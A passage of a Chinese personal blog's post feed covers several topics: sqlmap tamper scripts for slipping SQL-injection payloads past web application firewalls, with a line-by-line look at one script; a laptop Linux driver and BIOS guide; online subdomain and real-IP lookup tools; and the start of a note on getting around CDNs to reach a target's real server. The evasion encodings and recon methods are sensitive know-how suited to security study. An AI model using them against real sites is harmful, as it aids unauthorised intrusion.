class="line">lowercase.py-用小写值替换每个关键字字符（例如SELECT-&gt;选择）</span><br><span class="line">luanginx.py-LUA-Nginx WAF绕过（例如Cloudflare）</span><br><span class="line">modsecurityversioned.py-包含带有（MySQL）版本注释的完整查询</span><br><span class="line">modsecurityzeroversioned.py-包含带有（MySQL）零版本注释的完整查询</span><br><span class="line">multiplespaces.py-在SQL关键字周围添加多个空格（&#39;&#39;）</span><br><span class="line">overlongutf8.py-将给定有效载荷中的所有（非字母数字）字符转换为超长UTF8（未处理已编码）（例如&#39;-&gt;％C0％A7）</span><br><span class="line">overlongutf8more.py-将给定有效载荷中的所有字符转换为超长UTF8（尚未处理编码）（例如SELECT-&gt;％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94）</span><br><span class="line">percent.py-在每个字符前面添加一个百分号（&#39;％&#39;） （例如SELECT-&gt;％S％E％L％E％C％T）</span><br><span class="line">plus2concat.py-替换加号运算符（&#39;+&#39;）与（MsSQL）函数CONCAT（）对应</span><br><span class="line">plus2fnconcat.py-用（MsSQL）ODBC函数&#123;fn CONCAT（）&#125;替换加号（&#39;+&#39;）对应项</span><br><span class="line">randomcase.py-用随机大小写值替换每个关键字字符（例如SELECT-&gt; SEleCt）</span><br><span class="line">randomcomments.py -在SQL关键字内添加随机内联注释（例如SELECT-&gt; S &#x2F; ** &#x2F; E &#x2F; ** &#x2F; LECT）</span><br><span class="line">sp_password.py-将（MsSQL）函数&#39;sp_password&#39;附加到有效负载的末尾，以便从DBMS日志中自动进行混淆</span><br><span class="line">space2comment.py-用注释&#39;&#x2F; ** &#x2F;&#39; 替换空格字符（&#39;&#39;）</span><br><span class="line">space2dash.py-用短划线注释（&#39;-&#39;）替换空格字符（&#39;&#39;），后跟一个随机字符串和一个新的行（&#39;\ n&#39;）</span><br><span class="line">space2hash.py-用井字符（&#39;＃&#39;）替换（MySQL）空格字符（&#39;&#39;）实例，后跟随机字符串和换行（&#39;\ n&#39;）</span><br><span class="line">space2morecomment.py-替换（MySQL）带注释&#39;&#x2F; ** _ ** &#x2F;&#39; 的空格字符（&#39;&#39;）实例</span><br><span class="line">space2morehash.py-用井号（&#39;＃&#39;）后面跟一个随机字符串替换（MySQL）空格字符（&#39;&#39;）实例和新行（&#39;\ n&#39;）</span><br><span class="line">space2mssqlblank.py-用有效的替代字符集中的随机空白字符替换空间字符（&#39;&#39;）的（MsSQL）实例</span><br><span class="line">space2mssqlhash.py-替换空间字符（&#39;&#39; ）和井号（&#39;＃&#39;），后接换行（&#39;\ n&#39;）</span><br><span class="line">space2mysqlblank.py-用有效替代字符集中的随机空白字符替换（MySQL）空格字符（&#39;&#39;）实例</span><br><span class="line">space2mysqldash.py-用破折号（&#39;-&#39;）替换空格字符（&#39;&#39;） ）后跟换行（&#39;\ n&#39;）</span><br><span class="line">space2plus.py-用加号（&#39;+&#39;）替换空格字符（&#39;&#39;）</span><br><span class="line">space2randomblank.py-用空格中的随机空白字符替换空格字符（&#39;&#39;）有效的替代字符集</span><br><span class="line">substring2leftright.py-用LEFT和RIGHT替换PostgreSQL SUBSTRING</span><br><span class="line">symbolicologic.py-用其符号对应物（&amp;&amp;和||）替换AND和OR逻辑运算符</span><br><span class="line">unionalltounion.py-用UNION SELECT对应项替换UNION ALL SELECT的实例</span><br><span class="line">unmagicquotes.py-用多字节组合％BF％27替换引号字符（&#39;），并在末尾添加通用注释（以使其起作用）</span><br><span class="line">uppercase.py-用大写值替换每个关键字字符（例如select -&gt; SELECT）</span><br><span class="line">varnish.py-附加HTTP标头&#39;X-originating-IP&#39;以绕过Varnish防火墙</span><br><span class="line">versionedkeywords.py-用（MySQL）版本注释将每个非功能性关键字括起来</span><br><span class="line">versionedmorekeywords.py-将每个关键字包含（MySQL）版本注释</span><br><span class="line">xforwardedfor.py-附加伪造的HTTP标头&#39;X-Forwarded-For&#39;</span><br></pre></td></tr></table></figure>

<h2 id="Tamper脚本编写"><a href="#Tamper脚本编写" class="headerlink" title="Tamper脚本编写"></a>Tamper脚本编写</h2><h3 id="代码的编写"><a href="#代码的编写" class="headerlink" title="代码的编写"></a>代码的编写</h3><p>用脚本里面的<code>apostrophenullencode.py</code>为例<br>源代码是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces apostrophe character (&#x27;) with its illegal double unicode counterpart (e.g. &#x27; -&gt; %00%27)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span></span><br><span class="line"><span class="string">    &#x27;1 AND %00%271%00%27=%00%271&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&quot;%00%27&quot;</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200913113103812.png"></p>
<h3 id="上面的代码介绍"><a href="#上面的代码介绍" class="headerlink" title="上面的代码介绍"></a>上面的代码介绍</h3><h4 id="代码1"><a href="#代码1" class="headerlink" title="代码1"></a>代码1</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br></pre></td></tr></table></figure>
<p>他的调用编辑器进行解析</p>
<h4 id="代码2"><a href="#代码2" class="headerlink" title="代码2"></a>代码2</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>是脚本的介绍可以不填写</p>
<h4 id="代码3"><a href="#代码3" class="headerlink" title="代码3"></a>代码3</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br></pre></td></tr></table></figure>

<p><code>__priority__ = PRIORITY.LOW</code>是定义优先级的，上面这个是<code>LOWEST(最低)</code>他等于 -100<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913172529.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class PRIORITY(object):</span><br><span class="line">    LOWEST &#x3D; -100</span><br><span class="line">    LOWER &#x3D; -50</span><br><span class="line">    LOW &#x3D; -10</span><br><span class="line">    NORMAL &#x3D; 0</span><br><span class="line">    HIGH &#x3D; 10</span><br><span class="line">    HIGHER &#x3D; 50</span><br><span class="line">    HIGHEST &#x3D; 100</span><br></pre></td></tr></table></figure>
<p><code>PRIORITY.LOW</code>调用的<code>lib.core.enums</code>库在<code>/usr/share/sqlmap/lib/core/enums.py</code>文件里面</p>
<h4 id="代码4"><a href="#代码4" class="headerlink" title="代码4"></a>代码4</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>dependencies():此处是为了和整体脚本的结构保持一致。</p>
<p>pass：什么都不做，Python填充空内容，这样不会报错，代码的完整</p>
<h4 id="代码5"><a href="#代码5" class="headerlink" title="代码5"></a>代码5</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces apostrophe character (&#x27;) with its illegal double unicode counterpart (e.g. &#x27; -&gt; %00%27)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;)</span></span><br><span class="line"><span class="string">    &#x27;1 AND %00%271%00%27=%00%271&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&quot;%00%27&quot;</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
<p><code>def tamper(payload, **kwargs):</code><br>定义tamper脚本，payload, kwargs 为定义的参数，其中**kwargs为字典存储，类似于 {‘a’: 1, ‘c’: 3, ‘b’: 2} </p>
<p><code>&quot;&quot;&quot; &quot;&quot;&quot;</code>里面的是脚本的作用，介绍<br><code>return payload.replace(&#39;\&#39;&#39;, &quot;%00%27&quot;) if payload else payload</code><br>才是核心<br>上面的代码的作用就是叫<code>&#39;</code>转换成<code>%00%27</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200913173608.png"><br>上面的添加<code>\</code>应为是<code>&#39;</code>可能会让编辑器给作为字符执行，就用<code>\</code>，</p>
<h2 id="编写脚本绕过安全狗"><a href="#编写脚本绕过安全狗" class="headerlink" title="编写脚本绕过安全狗"></a>编写脚本绕过安全狗</h2>]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>天选姬电脑常见问题和linux的问题解决</title>
    <url>/2021/02/26/tianxuan/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>刚买的一个华硕天选姬，真的老二次元了，我给他装上我最喜欢的linux系统</p>
</div>

<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>我相信如果你也是天选姬也会遇到下面的的问题</p>
</div>

<div class="note blue icon simple"><i class="note-icon fas fa-bullhorn"></i><p>因为这个电脑的BIOS和我上个电脑的BIOS不太一样，中间发生了很多问题，下面是解决的方法</p>
</div>



<h1 id="天选安装linux的显卡问题"><a href="#天选安装linux的显卡问题" class="headerlink" title="天选安装linux的显卡问题"></a>天选安装linux的显卡问题</h1><div class="note info simple"><p>我起的linux出现nouveau 0000000，就是显卡问题</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225203318253.png" alt="image-20210225203318253"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>Linux用户最讨厌黄仁勋了，天天骂他</p>
</div>

<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>下面是linux之父直接国际手势给黄仁勋</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225202522698.png" alt="image-20210225202522698"></p>
<div class="note red icon simple"><i class="note-icon fas fa-fan"></i><p>原视频</p>
</div>

<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
<iframe src="//player.bilibili.com/player.html?aid=1198842&bvid=BV1Wx411T7Nt&cid=1785378&page=1" scrolling="Yes" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;" ></iframe></div>



<h2 id="第一种方法安装显卡驱动"><a href="#第一种方法安装显卡驱动" class="headerlink" title="第一种方法安装显卡驱动"></a>第一种方法安装显卡驱动</h2><div class="note info simple"><p>禁用 nouveau显卡</p>
</div>

<div class="note info simple"><p>进入系统按<code>Ctrl+F2</code>进入命令行环境，输入账号密码进入系统</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/1614241093049.jpg"></p>
<p>修改下面的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;modprobe.d&#x2F;amd64-microcode-blacklist.conf</span><br></pre></td></tr></table></figure>
<p>文件内容最后添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">blacklist nouveau</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/1614241380453.jpg" alt="1614241380453"></p>
<div class="note info simple"><p>刷新</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-initramfs -u</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226002647300.png" alt="image-20210226002647300"></p>
<div class="note info simple"><p>然后重启电脑<code>reboot</code></p>
</div>

<div class="note info simple"><p>然后进入系统查看nouveau有没有禁用</p>
</div>

<p>如果没有显示就是禁用了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsmod | grep nouveau</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>直接就可以安装驱动了</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nvidia-driver</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>然后重启然后就会有一个《NVIDIA X 服务器设置》的软件</p>
</div>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226004157516.png" alt="image-20210226004157516"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226004244782.png" alt="image-20210226004244782"></p>
<h2 id="第二种方法安装显卡驱动"><a href="#第二种方法安装显卡驱动" class="headerlink" title="第二种方法安装显卡驱动"></a>第二种方法安装显卡驱动</h2><div class="note info simple"><p>禁用 nouveau显卡</p>
</div>

<div class="note info simple"><p>启动的时候，显示选项kali选项的时候按e编辑启动项添加下面这个字，禁用nouveau</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226003341610.png" alt="image-20210226003341610"></p>
<div class="note info simple"><p>然后进入系统查看nouveau有没有禁用</p>
</div>

<p>如果没有显示就是禁用了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsmod | grep nouveau</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>直接就可以安装驱动了</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nvidia-driver</span><br></pre></td></tr></table></figure>
<div class="note info simple"><p>然后彻底禁用nouveau驱动</p>
</div>

<p>修改下面的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;modprobe.d&#x2F;amd64-microcode-blacklist.conf</span><br></pre></td></tr></table></figure>
<p>文件内容最后添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">blacklist nouveau</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226004112212.png" alt="image-20210226004112212"></p>
<div class="note info simple"><p>刷新</p>
</div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update-initramfs -u</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226004053297.png" alt="image-20210226004053297"></p>
<div class="note info simple"><p>然后重启然后就会有一个《NVIDIA X 服务器设置》的软件</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226004157516.png" alt="image-20210226004157516"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210226004244782.png" alt="image-20210226004244782"></p>
<h1 id="刷天选BIOS"><a href="#刷天选BIOS" class="headerlink" title="刷天选BIOS"></a>刷天选BIOS</h1><div class="note info simple"><p>天选刷bios很简单，一个U盘就可以了</p>
</div>

<h2 id="下载bios的文件"><a href="#下载bios的文件" class="headerlink" title="下载bios的文件"></a>下载bios的文件</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225195317806.png" alt="image-20210225195317806"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225195348033.png" alt="image-20210225195348033"></p>
<p>或者直接去官方下载地址<a href="https://www.asus.com.cn/support/Download-Center/">https://www.asus.com.cn/support/Download-Center/</a></p>
<p>输入自己的电脑型号就可以了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225195506182.png" alt="image-20210225195506182"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><div class="note info simple"><p>叫下载的文件解压到U盘里面</p>
</div>

<div class="note info simple"><p>然后重启按F2进入BIOS</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225195812555.png" alt="image-20210225195812555"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225200033771.png" alt="image-20210225200033771"></p>
<div class="note info simple"><p>选择自己的U盘</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225200058467.png" alt="image-20210225200058467"></p>
<div class="note info simple"><p>按键盘的右键进入U盘，找到BIOS文件</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225200211326.png" alt="image-20210225200211326"></p>
<div class="note info simple"><p>然后确定，记得一定要给电脑插电</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225200243711.png" alt="image-20210225200243711"></p>
<div class="note info simple"><p>这样就可以安装BIOS了，然后他会重启，重启完成就好了</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225200257359.png" alt="image-20210225200257359"></p>
<h1 id="安装相关linux问题解决"><a href="#安装相关linux问题解决" class="headerlink" title="安装相关linux问题解决"></a>安装相关linux问题解决</h1><div class="note info simple"><p>安装linux和U盘启动，要关闭BIOS的安全机制，不然启动不了</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210225195812555.png" alt="image-20210225195812555"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225201425689.png" alt="image-20210225201425689"></p>
<div class="note info simple"><p>选择这个Dxxxxx</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225201542062.png" alt="image-20210225201542062"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225170957817.png" alt="image-20210225170957817"></p>
<h1 id="启动项消失的问题解决"><a href="#启动项消失的问题解决" class="headerlink" title="启动项消失的问题解决"></a>启动项消失的问题解决</h1><div class="note info simple"><p>这个其实很简单在BIOS添加即可，如果我没有找到这个可能真的就重新装<code>kali linux</code>了</p>
</div>

<div class="note info simple"><p>开机按F2进入BIOS</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225195812555.png" alt="image-20210225195812555"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/2021-02-25_17-07.png" alt="image-20210225170440344"></p>
<div class="note info simple"><p>叫kali放在第一个启动里面</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225170858506.png" alt="image-20210225170858506"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210225170957817.png" alt="image-20210225170957817"></p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>web域名查询和子域名探测在线工具</title>
    <url>/2020/11/14/web%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2%E5%92%8C%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A2%E6%B5%8B%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="CDN检查寻找真实ip"><a href="#CDN检查寻找真实ip" class="headerlink" title="CDN检查寻找真实ip"></a>CDN检查寻找真实ip</h2><p>这个专门进行找真实ip的<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114151143.png"></p>
<p>IPIP平台超级ping地址<a href="https://tools.ipip.net/newping.php">https://tools.ipip.net/newping.php</a><br>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114144245.png"><br>ping地址<a href="https://www.ping.cn/ping/">https://www.ping.cn/ping/</a><br>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114151619.png"></p>
<h2 id="域名探测"><a href="#域名探测" class="headerlink" title="域名探测"></a>域名探测</h2><p>IPIP平台域名解析地址<a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a><br>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114144144.png"></p>
<h2 id="ip反向解析"><a href="#ip反向解析" class="headerlink" title="ip反向解析"></a>ip反向解析</h2><p>IPIP平台ip反向解析地址<a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a></p>
<p>站长工具地址域名反向解析地址<a href="http://tool.chinaz.com/Same/">http://tool.chinaz.com/Same/</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114145039.png"></p>
<p>viewdns平台ip反向解析地址[<a href="https://viewdns.info/][https://viewdns.info/]">https://viewdns.info/][https://viewdns.info/]</a></p>
<h2 id="子域名探测介绍"><a href="#子域名探测介绍" class="headerlink" title="子域名探测介绍"></a>子域名探测介绍</h2><p>子域名探测在信息收集是非常重要的<br>比如一个网站是xxx.cn,站是没有漏洞，我们就可以用子域名来寻找漏洞的地方</p>
<h2 id="通过搜索引擎寻找子域名"><a href="#通过搜索引擎寻找子域名" class="headerlink" title="通过搜索引擎寻找子域名"></a>通过搜索引擎寻找子域名</h2><p>自己写的搜索引擎的使用<a href="https://wzass.gitee.io/2020/10/27/1.web%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/">https://wzass.gitee.io/2020/10/27/1.web信息收集之搜索引擎/</a><br>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:域名</span><br></pre></td></tr></table></figure>
<p><strong>咧</strong><br>URL地址是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site:qq.com</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114114406.png"></p>
<h2 id="在线子域名查询"><a href="#在线子域名查询" class="headerlink" title="在线子域名查询"></a>在线子域名查询</h2><p>感觉这个不错SecurityTrails网站地址<a href="https://securitytrails.com/domain/www.baidu.com/history/a">https://securitytrails.com/domain/www.baidu.com/history/a</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114142634.png"></p>
<p>在线子域名枚举地址<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114115614.png"></p>
<p>微步在线威胁情报社区地址<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br>这个要注册一个账号<br>实咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114141019.png"></p>
<p>viewdns多个工具地址<a href="https://viewdns.info/">https://viewdns.info/</a><br>他有很多功能<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114141537.png"><br>随便用一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114141620.png"></p>
<p>SEO综合查询地址<a href="https://www.aizhan.com/cha/">https://www.aizhan.com/cha/</a><br>实咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114141857.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114141919.png"></p>
<p>NSDB网站地址<a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114143516.png"></p>
<p>实咧</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114144709.png"></p>
<p>DNSdumpster是很不错的子域名探测的网站地址<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114152458.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114152516.png"></p>
<p>证书探测<br><a href="https://crt.sh/">https://crt.sh/</a><br>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201114152634.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全之CDN绕过</title>
    <url>/2020/09/11/web%E5%AE%89%E5%85%A8%E4%B9%8BCDN%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>笔记</strong></p>
<h2 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h2><p>现在大的网站都会用到CDN，CDN简单来说就是个加速器<br>他是这么实现加速的那，比如你访问一个日本的服务器，如果是直接访问可能就很慢，如果你用了CDN，CDN会有分布在多个不同的地区位置的WEB服务器，如果我访问那个日本的服务器CDN就会找最近的有那个日本的网站的缓存进行访问</p>
<h2 id="为什么要绕过CDN"><a href="#为什么要绕过CDN" class="headerlink" title="为什么要绕过CDN"></a>为什么要绕过CDN</h2><p>比如我们想渗透一个web服务器为什么扫描的任何东西都是那个缓存的服务器上的，那到权限也是那个缓存</p>
<h2 id="如果检查目标使用了CDN"><a href="#如果检查目标使用了CDN" class="headerlink" title="如果检查目标使用了CDN"></a>如果检查目标使用了CDN</h2><h3 id="使用超级ping"><a href="#使用超级ping" class="headerlink" title="使用超级ping"></a>使用超级ping</h3><p>在搜索引擎搜索<code>超级ping</code>就可以访问出来<br>我用的是在个地址<a href="http://ping.chinaz.com/www.sqnu.edu.cn">http://ping.chinaz.com/www.sqnu.edu.cn</a><br>下面这个是没有用CDN可以看见响应的ip全部都是那一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201029161426.png"></p>
<p>下面这个是用CDN的每个地址访问的，他响应的IP都不一样<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201029162135.png"></p>
<h3 id="使用nslookup"><a href="#使用nslookup" class="headerlink" title="使用nslookup"></a>使用nslookup</h3><p>下面是没有做CDN的自己的服务器<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup www.wzass.icu</span><br></pre></td></tr></table></figure>
<p>可以看见他就一个ip<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201030094321.png"></p>
<p>下面是百度有CDN服务器的地址</p>
<p>可以看见有过个ip<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201030094513.png"></p>
<h2 id="通过子域名来寻找真实ip"><a href="#通过子域名来寻找真实ip" class="headerlink" title="通过子域名来寻找真实ip"></a>通过子域名来寻找真实ip</h2><p>我们在配置域名解析的时候都好吧网站的，<a href="http://www.xxxxx.xx都好这样,叫xxxxx.xx配置成真实服务器,/">www.xxxxx.xx都好这样，叫xxxxx.xx配置成真实服务器，</a></p>
